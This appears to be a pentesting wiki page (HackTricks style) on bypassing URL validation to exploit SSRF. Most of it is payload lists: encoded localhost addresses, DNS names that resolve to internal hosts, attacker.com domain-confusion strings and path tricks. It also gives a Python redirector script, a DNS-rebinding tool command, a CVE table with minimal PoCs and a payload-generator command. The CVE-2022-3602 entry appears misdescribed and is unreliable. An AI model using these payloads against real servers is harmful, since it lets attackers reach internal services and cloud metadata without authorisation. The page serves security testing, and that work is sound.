@@ -1,0 +1,306 @@
+# URL Format Bypass
+
+{{#include ../../banners/hacktricks-training.md}}
+
+### Localhost
+
+<details>
+<summary>Localhost payloads</summary><sup>[[1]](#references)[[2]](#references)</sup>
+
+```bash
+# Localhost
+0 # Yes, just 0 is localhost in Linux
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://127.1:80
+http://127.000000000000000.1
+http://0
+http:@0/ --> http://localhost/
+http://0.0.0.0:80
+http://localhost:80
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:3128/ Squid
+http://[0000::1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
+http://①②⑦.⓪.⓪.⓪
+
+# CIDR bypass
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+
+# Dot bypass
+127。0。0。1
+127%E3%80%820%E3%80%820%E3%80%821
+
+# Decimal bypass
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+
+# Octal Bypass
+http://0177.0000.0000.0001
+http://00000177.00000000.00000000.00000001
+http://017700000001
+
+# Hexadecimal bypass
+127.0.0.1 = 0x7f 00 00 01
+http://0x7f000001/ = http://127.0.0.1
+http://0xc0a80014/ = http://192.168.0.20
+0x7f.0x00.0x00.0x01
+0x0000007f.0x00000000.0x00000000.0x00000001
+
+# Mixed encodings bypass
+169.254.43518 -> Partial Decimal (Class B) format combines the third and fourth parts of the IP address into a decimal number
+0xA9.254.0251.0376 -> hexadecimal, decimal and octal
+
+# Add 0s bypass
+127.000000000000.1
+
+# You can also mix different encoding formats
+# https://www.silisoftware.com/tools/ipconverter.php
+
+# Malformed and rare
+localhost:+11211aaa
+localhost:00011211aaaa
+http://0/
+http://127.1
+http://127.0.1
+
+# DNS to localhost
+localtest.me = 127.0.0.1
+customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
+mail.ebc.apple.com = 127.0.0.6 (localhost)
+127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
+www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://bugbounty.dod.network = 127.0.0.2 (localhost)
+1ynrnhl.xip.io == 169.254.169.254
+spoofed.burpcollaborator.net = 127.0.0.1
+```
+
+</details>
+
+![Malformed and rare - DNS to localhost: spoofed.burpcollaborator.net = 127.0.0.1](<../../images/image (776).png>)
+
+The **Burp extension** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) implements IP formatting bypasses.
+
+### Domain Parser
+
+<details>
+<summary>Domain parser bypasses</summary>
+
+```bash
+https:attacker.com
+https:/attacker.com
+http:/\/\attacker.com
+https:/\attacker.com
+//attacker.com
+\\/\/attacker.com/
+/\/attacker.com/
+/attacker.com
+%0D%0A/attacker.com
+#attacker.com
+#%20@attacker.com
+@attacker.com
+http://169.254.1698.254\@attacker.com
+attacker%00.com
+attacker%E3%80%82com
+attacker。com
+ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
+# double encoded fragment to bypass split("#"): attacker.com%2523@victim
+```
+
+</details>
+
+```
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
+⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
+⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
+⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
+Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
+ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+```
+
+### Domain Confusion
+
+<details>
+<summary>Domain confusion payloads</summary><sup>[[3]](#references)</sup>
+
+```bash
+# Try also to change attacker.com for 127.0.0.1 to try to access localhost
+# Try replacing https by http
+# Try URL-encoded characters
+https://{domain}@attacker.com
+https://{domain}.attacker.com
+https://{domain}%6D@attacker.com
+https://attacker.com/{domain}
+https://attacker.com/?d={domain}
+https://attacker.com#{domain}
+https://attacker.com@{domain}
+https://attacker.com#@{domain}
+https://attacker.com%23@{domain}
+https://attacker.com%00{domain}
+https://attacker.com%0A{domain}
+https://attacker.com?{domain}
+https://attacker.com///{domain}
+https://attacker.com\{domain}/
+https://attacker.com;https://{domain}
+https://attacker.com\{domain}/
+https://attacker.com\.{domain}
+https://attacker.com/.{domain}
+https://attacker.com\@@{domain}
+https://attacker.com:\@@{domain}
+https://attacker.com#\@{domain}
+https://attacker.com\anything@{domain}/
+https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
+# colon + backslash confusion (CVE-2025-0454 in autogpt)
+http://localhost:\@google.com/../
+
+# On each IP position try to put 1 attackers domain and the others the victim domain
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+
+# Parameter pollution
+next={domain}&next=attacker.com
+```
+
+</details>
+
+### Paths and Extensions Bypass
+
+If you are required that the URL must end in a path or an extension, or must contain a path you can try one of the following bypasses:
+
+```
+https://metadata/vulnerable/path#/expected/path
+https://metadata/vulnerable/path#.extension
+https://metadata/expected/path/..%2f..%2f/vulnerable/path
+```
+
+### Fuzzing
+
+The tool [**recollapse**](https://github.com/0xacb/recollapse) can generate variations from a given input to try to bypass the used regex. Check [**this post**](https://0xacb.com/2022/11/21/recollapse/) also for more information.<sup>[[4]](#references)</sup>
+
+### Automatic Custom Wordlists
+
+Check out the [**URL validation bypass cheat sheet** webapp](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) from portswigger were you can introduce the allowed host and the attackers one and it'll generate a list of URLs to try for you. It also considers if you can use the URL in a parameter, in a Host header or in a CORS header.
+
+
+{{#ref}}
+https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+{{#endref}}
+
+### Bypass via redirect
+
+It might be possible that the server is **filtering the original request** of a SSRF **but not** a possible **redirect** response to that request.\
+For example, a server vulnerable to SSRF via: `url=https://www.google.com/` might be **filtering the url param**. But if you uses a [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) to the place where you want to redirect, you might be able to **access filtered IP addresses** like 127.0.0.1 or even filtered **protocols** like gopher.\
+[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)<sup>[[5]](#references)</sup>
+
+<details>
+<summary>Simple redirector for SSRF testing</summary>
+
+```python
+#!/usr/bin/env python3
+
+#python3 ./redirector.py 8000 http://127.0.0.1/
+
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+if len(sys.argv)-1 != 2:
+    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
+    sys.exit()
+
+class Redirect(BaseHTTPRequestHandler):
+   def do_GET(self):
+       self.send_response(302)
+       self.send_header('Location', sys.argv[2])
+       self.end_headers()
+
+HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
+```
+
+</details>
+
+### DNS rebinding bypass (2025+)
+
+Even when an SSRF filter performs a **single DNS resolution before sending the HTTP request**, you can still reach internal hosts by rebinding the domain between lookup and connection:
+
+1. Point `victim.example.com` to a public IP so it passes the allow‑list / CIDR check.
+2. Serve a very low TTL (or use an authoritative server you control) and rebind the domain to `127.0.0.1` or `169.254.169.254` just before the real request is made.
+3. Tools like **Singularity** (`nccgroup/singularity`) automate the authoritative DNS + HTTP server and include ready‑made payloads. Example launch: `python3 singularity.py --lhost <your_ip> --rhost 127.0.0.1 --domain rebinder.test --http-port 8080`.
+
+This technique was used in 2025 to bypass the BentoML "safe URL" patch and similar single‑resolve SSRF filters.<sup>[[6]](#references)</sup>
+
+### Explained Tricks
+
+#### Backslash-trick
+
+The _backslash-trick_ exploits a difference between the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) and [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). While RFC3986 is a general framework for URIs, WHATWG is specific to web URLs and is adopted by modern browsers. The key distinction lies in the WHATWG standard's recognition of the backslash (`\`) as equivalent to the forward slash (`/`), impacting how URLs are parsed, specifically marking the transition from the hostname to the path in a URL.<sup>[[7]](#references)</sup>
+
+![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec_difference.jpg)
+
+#### Left square bracket
+
+The “left square bracket” character `[` in the userinfo segment can cause Spring’s UriComponentsBuilder to return a hostname value that differs from browsers: [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)<sup>[[2]](#references)</sup>
+
+#### Other Confusions
+
+![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)<sup>[[8]](#references)</sup>
+
+image from [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)<sup>[[8]](#references)</sup>
+
+#### IPv6 Zone Identifier (%25) Trick
+
+Modern URL parsers that support RFC 6874 allow *link-local* IPv6 addresses to include a **zone identifier** after a percent sign. Some security filters are not aware of this syntax and will only strip square-bracketed IPv6 literals, letting the following payload reach an internal interface:
+
+```text
+http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
+http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
+```
+
+If the target application validates that the host is *not* `fe80::1` but stops parsing at the `%`, it may incorrectly treat the request as external. Always normalise the address **before** any security decision or strip the optional zone id entirely.
+
+### Recent Library Parsing CVEs (2022–2026)
+
+A number of mainstream frameworks have suffered from hostname-mismatch issues that can be exploited for SSRF once URL validation has been bypassed with the tricks listed above:
+
+| Year | CVE | Component | Bug synopsis | Minimal PoC |
+|------|-----|-----------|--------------|-------------|
+| 2025 | CVE-2025-0454 | Python `requests` + `urllib.parse` (autogpt) | Parsing mismatch on `http://localhost:\\@google.com/../` lets allow‑lists think host is `google.com` while the request hits `localhost`.<sup>[[9]](#references)</sup> | `requests.get("http://localhost:\\@google.com/../")` |
+| 2025 | CVE-2025-2691 | Node package `nossrf` | Library meant to block SSRF only checks the original hostname, not the **resolved IP**, allowing hostnames that resolve to private ranges. | `curl "http://trusted.example" --resolve trusted.example:80:127.0.0.1` |
+| 2024 | CVE-2024-29415 | Node `ip` package | `isPublic()` misclassified dotted‑octal / short‑form localhost (e.g., `0127.0.0.1`, `127.1`) as public, letting filters accept internal targets.<sup>[[10]](#references)</sup> | `ip.isPublic('0127.0.0.1')` returns true on vulnerable versions |
+| 2024 | CVE-2024-3095 | Langchain WebResearchRetriever | No host filtering; GET requests could reach IMDS/localhost from AI agents.<sup>[[11]](#references)</sup> | User‑controlled URL inside `WebResearchRetriever` |
+| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | `[` in userinfo parsed differently by Spring vs browsers, allowing allow‑list bypass.<sup>[[12]](#references)</sup> | `https://example.com\[@internal` |
+| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | Backslash confusion allowed `http://example.com\\@169.254.169.254/` to bypass host filters that split on `@`. | — |
+| 2022 | CVE-2022-3602 | OpenSSL | Hostname verification skipped when the name is suffixed with a `.` (dotless domain confusion). | — |
+
+### Payload-generation helpers (2024+)
+
+Creating large custom word-lists by hand is cumbersome. The open-source tool **SSRF-PayloadMaker** (Python 3) can now generate *80 k+* host-mangling combinations automatically, including mixed encodings, forced-HTTP downgrade and backslash variants:<sup>[[13]](#references)</sup>
+
+```bash
+# Generate every known bypass that transforms the allowed host example.com to attacker.com
+python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
+```
+
+The resulting list can be fed directly into Burp Intruder or `ffuf`. 
+
+## References
+
+- [1] [AlbusSec - Penetration List 08: Server-Side Request Forgery (SSRF) Sample](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
+- [2] [PortSwigger Research - New crazy payloads in the URL validation bypass cheat sheet](https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
+- [3] [PayloadsAllTheThings - Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
+- [4] [0xacb - Recollapse: a tool to help find bypasses for blacklists/regex filters](https://0xacb.com/2022/11/21/recollapse/)
+- [5] [sirleeroyjenkins - Just Gopher It: Escalating a Blind SSRF to RCE for $15k](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
+- [6] [Tenable - How Tenable bypassed the patch for the BentoML SSRF vulnerability (CVE-2025-54381)](https://www.tenable.com/blog/how-tenable-bypassed-patch-for-bentoml-ssrf-vulnerability-CVE-2025-54381)
+- [7] [xdavidhu - Fixing the Unfixable: Story of a Google Cloud SSRF](https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/)
+- [8] [Claroty - Exploiting URL Parsing Confusion](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)
+- [9] [CVE-2025-0454: AutoGPT SSRF via URL parsing confusion](https://medium.com/%40narendarlb123/1-cve-2025-0454-autogpt-ssrf-via-url-parsing-confusion-921d66fafcbe)
+- [10] [GHSA-2p57-rm9w-gvfp - `ip` package SSRF improper categorization in `isPublic` (CVE-2024-29415)](https://github.com/advisories/GHSA-2p57-rm9w-gvfp)
+- [11] [GHSA-q25c-c977-4cmh - SSRF in langchain-community WebResearchRetriever (CVE-2024-3095)](https://github.com/advisories/GHSA-q25c-c977-4cmh)
+- [12] [NVD - CVE-2024-22243 detail](https://nvd.nist.gov/vuln/detail/CVE-2024-22243)
+- [13] [SSRF-PayloadMaker (GitHub - hsynuzm/SSRF-PayloadMaker)](https://github.com/hsynuzm/SSRF-PayloadMaker)
+
+{{#include ../../banners/hacktricks-training.md}}
